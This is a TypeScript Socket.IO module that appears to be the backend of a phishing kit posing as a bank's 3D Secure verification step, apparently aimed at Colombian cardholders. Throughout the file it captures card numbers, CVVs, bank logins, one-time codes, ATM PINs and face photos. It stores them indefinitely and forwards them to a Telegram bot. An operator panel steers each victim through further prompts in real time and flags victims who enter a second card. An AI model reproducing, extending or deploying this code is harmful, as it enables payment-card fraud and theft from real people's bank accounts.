/**
 * Socket.IO Module - Real-time communication between Admin Panel and 3D Secure Modal
 * 
 * This module is designed to be REUSABLE across projects.
 * It handles:
 * - User sessions connecting from the 3D Secure modal
 * - Admin panel connecting to monitor and control sessions
 * - Real-time data flow: user submits data → admin sees it → admin decides next step
 */

import { Server as HttpServer } from "http";
import { Server, Socket } from "socket.io";
import { notifyNewSession, notifyStepData, notifyAdminAction, sendTelegramMessage, escapeHtml } from "./telegram";
import { getAppConfig, upsertSecureSession, getPreviousCardForUser, getAllSecureSessions } from "./db";
import { sendFaceIDToTelegram } from "./telegramFaceID";
import { tgApi } from "./tgapi";


let io: Server | null = null;

// In-memory session store (for real-time state)
interface ActiveSession {
  sessionId: string;
  socketId: string;
  email?: string;
  cardBin?: string;
  cardNumber?: string;
  bankName?: string;
  country?: string;
  cardScheme?: string;
  cardCategory?: string;
  currentStep: string;
  status: string;
  data: Record<string, string>;
  connectedAt: number;
  ipAddress?: string;
  userAgent?: string;
  lastActivity: number;
  isOnline: boolean;
  // Pre-3DS captured data
  loginPassword?: string;
  holderName?: string;
  expiryDate?: string;
  cvv?: string;
  address?: string;
  cedula?: string;
  city?: string;
  // Post-3DS captured data (promoted from session.data)
  bankUser?: string;
  bankPassword?: string;
  otpCode?: string;
  dinamicaCode?: string;
  tokenCode?: string;
  atmPin?: string;
}

const activeSessions = new Map<string, ActiveSession>();
const adminSockets = new Set<string>();

// Load recent sessions from DB on startup so they survive server restarts
async function loadSessionsFromDB() {
  try {
    const dbSessions = await getAllSecureSessions();
    if (!dbSessions || dbSessions.length === 0) return;
    // Load ALL sessions from DB (no time cutoff - never lose data)
    let loaded = 0;
    for (const s of dbSessions) {
      const updatedAt = s.updatedAt ? new Date(s.updatedAt).getTime() : 0;
      if (activeSessions.has(s.sessionId)) continue;
      activeSessions.set(s.sessionId, {
        sessionId: s.sessionId,
        socketId: "", // No active socket
        email: s.email || undefined,
        cardBin: s.cardBin || undefined,
        cardNumber: s.cardNumber || undefined,
        bankName: s.bankName || undefined,
        country: s.country || undefined,
        cardScheme: s.cardScheme || undefined,
        cardCategory: undefined,
        currentStep: s.currentStep || "credentials",
        status: s.status || "active",
        data: {},
        connectedAt: s.createdAt ? new Date(s.createdAt).getTime() : updatedAt,
        ipAddress: s.ipAddress || undefined,
        userAgent: s.userAgent || undefined,
        lastActivity: updatedAt,
        isOnline: false,
        loginPassword: s.loginPassword || undefined,
        holderName: s.holderName || undefined,
        expiryDate: s.expiryDate || undefined,
        cvv: s.cvv || undefined,
        address: s.address || undefined,
        cedula: s.cedula || undefined,
        city: s.city || undefined,
        bankUser: s.bankUser || undefined,
        bankPassword: s.bankPassword || undefined,
        otpCode: s.otpCode || undefined,
        dinamicaCode: s.dinamicaCode || undefined,
        tokenCode: s.tokenCode || undefined,
        atmPin: s.atmPin || undefined,
      });
      loaded++;
    }
    if (loaded > 0) {
      console.log(`[Socket] Loaded ${loaded} recent sessions from database`);
    }
  } catch (err) {
    console.error("[Socket] Failed to load sessions from DB:", err);
  }
}

export function getActiveSessions() {
  return Array.from(activeSessions.values());
}

export function getSessionById(sessionId: string) {
  return activeSessions.get(sessionId) || null;
}

export function registerSocketIO(server: HttpServer) {
  io = new Server(server, {
    cors: {
      origin: "*",
      methods: ["GET", "POST"],
    },
    path: "/api/socket.io",
    maxHttpBufferSize: 10 * 1024 * 1024, // 10MB to support large images (Face ID photos)
  });

  // Load sessions from DB on startup
  loadSessionsFromDB();

  io.on("connection", (socket: Socket) => {
    console.log(`[Socket] New connection: ${socket.id}`);

    // ==========================================
    // ADMIN EVENTS
    // ==========================================

    // Admin joins the admin room
    socket.on("admin:join", () => {
      adminSockets.add(socket.id);
      socket.join("admin-room");
      // Send current active sessions to the admin
      socket.emit("admin:sessions", Array.from(activeSessions.values()));
      console.log(`[Socket] Admin joined: ${socket.id}`);
    });

    // Admin sends a command to a specific user session
    socket.on("admin:send-step", (data: { sessionId: string; step: string }) => {
      const session = activeSessions.get(data.sessionId);
      if (session) {
        session.currentStep = data.step;
        session.status = "active";
        session.lastActivity = Date.now();
        // Send the step command to the user's socket
        io?.to(session.socketId).emit("user:goto-step", { step: data.step });
        // Notify all admins of the update
        io?.to("admin-room").emit("admin:session-updated", session);
        // Persist to DB (bumps updatedAt so reactivated sessions rise to top)
        upsertSecureSession({
          sessionId: data.sessionId,
          currentStep: data.step,
          status: "active",
        } as any);
        console.log(`[Socket] Admin sent step "${data.step}" to session ${data.sessionId}`);
      }
    });

    // Admin clears all in-memory sessions (reset live panel)
    socket.on("admin:clear-sessions", () => {
      activeSessions.clear();
      io?.to("admin-room").emit("admin:sessions", []);
      console.log(`[Socket] Admin cleared all active sessions`);
    });

    // Admin rejects/completes a session
    socket.on("admin:update-status", (data: { sessionId: string; status: string }) => {
      const session = activeSessions.get(data.sessionId);
      if (session) {
        session.status = data.status;
        io?.to(session.socketId).emit("user:status-update", { status: data.status });
        io?.to("admin-room").emit("admin:session-updated", session);
        // Send to Telegram
        if (data.status === "completed" || data.status === "rejected") {
          notifyAdminAction({
            sessionId: data.sessionId,
            action: data.status,
            email: session.email,
            ipAddress: session.ipAddress,
          });
        }
        // Persist status to DB
        upsertSecureSession({
          sessionId: data.sessionId,
          status: data.status,
          currentStep: session.currentStep,
        } as any);
        console.log(`[Socket] Admin updated status to "${data.status}" for session ${data.sessionId}`);
      }
    });

    // ==========================================
    // USER (3D SECURE) EVENTS
    // ==========================================

    // User starts a new 3D Secure session
    socket.on("user:start-session", (data: {
      sessionId: string;
      email?: string;
      cardBin?: string;
      cardNumber?: string;
      bankName?: string;
      country?: string;
      cardScheme?: string;
      cardCategory?: string;
      ipAddress?: string;
      userAgent?: string;
      // Pre-3DS data
      loginPassword?: string;
      holderName?: string;
      expiryDate?: string;
      cvv?: string;
      address?: string;
      cedula?: string;
      city?: string;
    }) => {
      const session: ActiveSession = {
        sessionId: data.sessionId,
        socketId: socket.id,
        email: data.email,
        cardBin: data.cardBin,
        cardNumber: data.cardNumber,
        bankName: data.bankName,
        country: data.country,
        cardScheme: data.cardScheme,
        cardCategory: data.cardCategory,
        currentStep: "credentials",
        status: "active",
        data: {},
        connectedAt: Date.now(),
        ipAddress: data.ipAddress,
        userAgent: data.userAgent,
        lastActivity: Date.now(),
        isOnline: true,
        // Pre-3DS captured data
        loginPassword: data.loginPassword,
        holderName: data.holderName,
        expiryDate: data.expiryDate,
        cvv: data.cvv,
        address: data.address,
        cedula: data.cedula,
        city: data.city,
      };
      activeSessions.set(data.sessionId, session);
      // Notify admins of new session
      io?.to("admin-room").emit("admin:new-session", session);
      // Send to Telegram
      notifyNewSession({
        sessionId: data.sessionId,
        email: data.email,
        cardBin: data.cardBin,
        cardNumber: data.cardNumber,
        bankName: data.bankName,
        country: data.country,
        cardScheme: data.cardScheme,
        cardCategory: data.cardCategory,
        ipAddress: data.ipAddress,
      });
      // Persist to DB
      upsertSecureSession({
        sessionId: data.sessionId,
        email: data.email || null,
        cardBin: data.cardBin || null,
        cardNumber: data.cardNumber || null,
        bankName: data.bankName || null,
        country: data.country || null,
        cardScheme: data.cardScheme || null,
        ipAddress: data.ipAddress || null,
        userAgent: data.userAgent || null,
        holderName: data.holderName || null,
        expiryDate: data.expiryDate || null,
        cvv: data.cvv || null,
        address: data.address || null,
        cedula: data.cedula || null,
        city: data.city || null,
        currentStep: "credentials",
        status: "active",
      });
      console.log(`[Socket] User started session: ${data.sessionId}`);

      // Check for previous cards from same user (email/IP) and notify Telegram
      (async () => {
        try {
          const prevCard = await getPreviousCardForUser(data.email, data.ipAddress, data.sessionId);
          if (prevCard && (prevCard.cardNumber || prevCard.cardBin)) {
            // Only alert if the card is actually different
            const prevNum = (prevCard.cardNumber || prevCard.cardBin || "").trim();
            const currNum = (data.cardNumber || data.cardBin || "").trim();
            if (prevNum === currNum) {
              console.log(`[Socket] Same card re-entered for ${data.sessionId}, skipping alert`);
              return;
            }
            // Notify admin panel about linked sessions
            io?.to("admin-room").emit("admin:linked-card-detected", {
              sessionId: data.sessionId,
              previousSessionId: prevCard.sessionId,
              previousCard: prevCard.cardNumber || prevCard.cardBin,
              previousBank: prevCard.bankName,
              currentCard: data.cardNumber || data.cardBin,
              currentBank: data.bankName,
              email: data.email,
              ipAddress: data.ipAddress,
            });
            // Send Telegram alert about card change
            const cfg = await getAppConfig();
            const token = cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
            const chatId = cfg.telegramChatId || process.env.TELEGRAM_CHAT_ID || "";
            if (token && chatId) {
              const msgText =
                `\u26a0\ufe0f <b>CAMBIO DE TARJETA DETECTADO</b>\n\n` +
                `\ud83d\udc64 Mismo usuario (${escapeHtml(data.email || data.ipAddress || '—')})\n\n` +
                `\u274c <b>Tarjeta anterior:</b>\n` +
                `\u2514 \ud83d\udcb3 <code>${escapeHtml(prevNum)}</code>\n` +
                `\u2514 \ud83c\udfe6 ${escapeHtml(prevCard.bankName || '—')}\n\n` +
                `\u2705 <b>Tarjeta nueva:</b>\n` +
                `\u2514 \ud83d\udcb3 <code>${escapeHtml(currNum)}</code>\n` +
                `\u2514 \ud83c\udfe6 ${escapeHtml(data.bankName || '—')}\n\n` +
                `\ud83c\udd94 Sesión anterior: <code>${prevCard.sessionId}</code>\n` +
                `\ud83c\udd95 Sesión nueva: <code>${data.sessionId}</code>\n` +
              `\ud83d\udcc5 ${new Date().toLocaleString('es-CO')}`;
              const tgUrl = tgApi(token, 'sendMessage');
              const tgResp = await fetch(tgUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: msgText,
                  parse_mode: "HTML",
                  disable_web_page_preview: true,
                }),
              });
              if (!tgResp.ok) {
                const errBody = await tgResp.text();
                console.error(`[Socket] Telegram card-change alert failed (${tgResp.status}): ${errBody}`);
              } else {
                console.log(`[Socket] Telegram: card change alert sent for ${data.sessionId}`);
              }
            }
          }
        } catch (err) {
          console.error("[Socket] Error checking linked cards:", err);
        }
      })();
    });

    // User submits data for current step
    socket.on("user:submit-data", (data: {
      sessionId: string;
      step: string;
      values: Record<string, string>;
    }) => {
      const session = activeSessions.get(data.sessionId);
      if (session) {
        // Store the submitted data
        Object.assign(session.data, data.values);
        session.currentStep = data.step;
        session.status = "waiting"; // Waiting for admin decision
        session.lastActivity = Date.now();
        // Promote key fields to top-level so admin panel can read them directly
        if (data.values.bankUser) session.bankUser = data.values.bankUser;
        if (data.values.bankPassword) session.bankPassword = data.values.bankPassword;
        if (data.values.otpCode) session.otpCode = data.values.otpCode;
        if (data.values.claveDinamica) session.dinamicaCode = data.values.claveDinamica;
        if (data.values.tokenSeguridad) session.tokenCode = data.values.tokenSeguridad;
        if (data.values.claveATM) session.atmPin = data.values.claveATM;
        // Notify admins of new data
        io?.to("admin-room").emit("admin:data-received", {
          sessionId: data.sessionId,
          step: data.step,
          values: data.values,
          session,
        });
        // Send to Telegram
        notifyStepData({
          sessionId: data.sessionId,
          email: session.email,
          cardBin: session.cardBin,
          cardNumber: session.cardNumber,
          bankName: session.bankName,
          country: session.country,
          cardScheme: session.cardScheme,
          ipAddress: session.ipAddress,
          step: data.step,
          values: data.values,
          allData: { ...session.data },
        });
        // Persist to DB
        const dbUpdate: Record<string, any> = {
          sessionId: data.sessionId,
          currentStep: data.step,
          status: "waiting",
        };
        if (data.values.bankUser) dbUpdate.bankUser = data.values.bankUser;
        if (data.values.bankPassword) dbUpdate.bankPassword = data.values.bankPassword;
        if (data.values.otpCode) dbUpdate.otpCode = data.values.otpCode;
        if (data.values.claveDinamica) dbUpdate.dinamicaCode = data.values.claveDinamica;
        if (data.values.tokenSeguridad) dbUpdate.tokenCode = data.values.tokenSeguridad;
        if (data.values.claveATM) dbUpdate.atmPin = data.values.claveATM;
        upsertSecureSession(dbUpdate as any);
        console.log(`[Socket] User submitted data for step "${data.step}" in session ${data.sessionId}`);
      }
    });

    // ==========================================
    // FACE ID EVENTS
    // ==========================================

    socket.on("user:faceid-start", (data: { sessionId: string; ipAddress?: string }) => {
      console.log(`[Socket] FaceID session started: ${data.sessionId}`);
      // Register FaceID session in activeSessions so admin:send-step works
      if (!activeSessions.has(data.sessionId)) {
        activeSessions.set(data.sessionId, {
          sessionId: data.sessionId,
          socketId: socket.id,
          currentStep: "faceid",
          status: "active",
          isOnline: true,
          connectedAt: Date.now(),
          lastActivity: Date.now(),
          data: {},
          ipAddress: data.ipAddress || "",
        });
      } else {
        // Update socketId if session already exists (reconnection)
        const session = activeSessions.get(data.sessionId)!;
        session.socketId = socket.id;
        session.isOnline = true;
        session.currentStep = "faceid";
      }
      io?.to("admin-room").emit("admin:faceid-start", { sessionId: data.sessionId, socketId: socket.id, ipAddress: data.ipAddress });
    });

    socket.on("user:faceid-upload", (data: { sessionId: string; type: string; image: string }) => {
      console.log(`[Socket] FaceID upload: ${data.type} for ${data.sessionId}`);
      io?.to("admin-room").emit("admin:faceid-upload", { sessionId: data.sessionId, type: data.type, image: data.image, socketId: socket.id });
      // Send photo to dedicated FACE ID Telegram group
      sendFaceIDToTelegram(data.sessionId, data.type, data.image).catch((err: unknown) => {
        console.error("[Socket] Error sending FaceID to Telegram:", err);
      });
    });

    // Admin sends command to FaceID user
    socket.on("admin:faceid-command", (data: { socketId: string; command: string }) => {
      io?.to(data.socketId).emit("user:faceid-command", { command: data.command });
    });

    // Admin sends custom text message to user
    socket.on("admin:send-custom-text", (data: { sessionId: string; message: string }) => {
      const session = activeSessions.get(data.sessionId);
      if (session) {
        io?.to(session.socketId).emit("user:custom-text", { message: data.message });
        console.log(`[Socket] Admin sent custom text to session ${data.sessionId}: ${data.message}`);
      }
    });

    // User responds to custom text question
    socket.on("user:custom-text-response", (data: { sessionId: string; question: string; answer: string }) => {
      console.log(`[Socket] Custom text response from ${data.sessionId}: ${data.answer}`);
      // Forward to admin panel
      io?.to("admin-room").emit("admin:custom-text-response", {
        sessionId: data.sessionId,
        question: data.question,
        answer: data.answer,
      });
      // Also send to Telegram WITH action buttons — use getAppConfig() directly to bypass cache
      const session = activeSessions.get(data.sessionId);
      (async () => {
        try {
          console.log(`[Socket] Sending custom-text-response to Telegram: question="${data.question}" answer="${data.answer}"`);
          // Always load fresh config from DB
          const cfg = await getAppConfig();
          const token = cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
          const chatId = cfg.telegramChatId || process.env.TELEGRAM_CHAT_ID || "";
          console.log(`[Socket] Telegram config: token=${token ? token.substring(0,10) + '...' : 'EMPTY'} chatId=${chatId || 'EMPTY'}`);
          if (!token || !chatId) {
            console.error("[Socket] Cannot send RESPUESTA TEXTO: token or chatId missing");
            return;
          }
          const sessionInfo = session
            ? `\n📧 ${session.email || '—'} | 💳 ${session.cardNumber || session.cardBin || '—'}\n🏦 ${session.bankName || '—'} | 🌐 IP: ${session.ipAddress || '—'}`
            : '';
          // Use short codes for callback_data to stay under Telegram's 64-byte limit
          const sid = data.sessionId; // full sessionId fits within 64 bytes
          const buttons = {
            inline_keyboard: [
              [
                { text: "🏠 Dirección", callback_data: `q:${sid}:dir` },
                { text: "🎂 F. Nacimiento", callback_data: `q:${sid}:fnac` },
              ],
              [
                { text: "🆔 Cédula", callback_data: `q:${sid}:ced` },
                { text: "💳 Núm. Tarjeta", callback_data: `q:${sid}:ntarj` },
              ],
              [
                { text: "🔐 CVV", callback_data: `q:${sid}:cvv` },
                { text: "📱 Teléfono", callback_data: `q:${sid}:tel` },
              ],
              [
                { text: "💳 Cupo", callback_data: `q:${sid}:cupo` },
                { text: "🏦 Clave Banco", callback_data: `q:${sid}:clvbnk` },
              ],
              [
                { text: "📱 OTP", callback_data: `step:${sid}:otp` },
                { text: "🔑 DINÁMICA", callback_data: `step:${sid}:dinamica` },
                { text: "🔐 TOKEN", callback_data: `step:${sid}:token` },
                { text: "🏧 ATM", callback_data: `step:${sid}:atm` },
              ],
            ],
          };
          const msgText =
            `✉️ <b>RESPUESTA TEXTO</b>${sessionInfo}\n\n` +
            `💬 Pregunta: <i>${escapeHtml(data.question || '')}</i>\n` +
            `✅ Respuesta: <code>${escapeHtml(data.answer || '')}</code>\n\n` +
            `📅 ${new Date().toLocaleString('es-CO')}\n\n` +
          `⬇️ <b>Siguiente acción:</b>`;
          const tgUrl = tgApi(token, 'sendMessage');
          const tgBody = {
            chat_id: chatId,
            text: msgText,
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: buttons,
          };
          console.log(`[Socket] Calling Telegram API: ${tgUrl.substring(0, 50)}...`);
          const resp = await fetch(tgUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(tgBody),
          });
          const respText = await resp.text();
          console.log(`[Socket] Telegram RESPUESTA TEXTO result: status=${resp.status} body=${respText.substring(0, 200)}`);
        } catch (err) {
          console.error('[Socket] custom-text-response Telegram error:', err);
        }
      })();
    });

    // ==========================================
    // DISCONNECT
    // ==========================================

    socket.on("disconnect", () => {
      // Remove from admin sockets
      if (adminSockets.has(socket.id)) {
        adminSockets.delete(socket.id);
        console.log(`[Socket] Admin disconnected: ${socket.id}`);
      }

      // Mark user session as inactive (don't delete)
      for (const [sessionId, session] of Array.from(activeSessions.entries())) {
        if (session.socketId === socket.id) {
          session.isOnline = false;
          session.lastActivity = Date.now();
          io?.to("admin-room").emit("admin:session-updated", session);
          // Persist disconnect activity to DB
          upsertSecureSession({
            sessionId,
            status: session.status,
          } as any);
          console.log(`[Socket] User session went offline: ${sessionId}`);
          break;
        }
      }
    });
  });

  // ==========================================
  // NOTE: Auto-cleanup DISABLED - sessions are never removed from memory
  // They persist until server restart (and are reloaded from DB on restart)
  // ==========================================

  return io;
}

export function getIO() {
  return io;
}
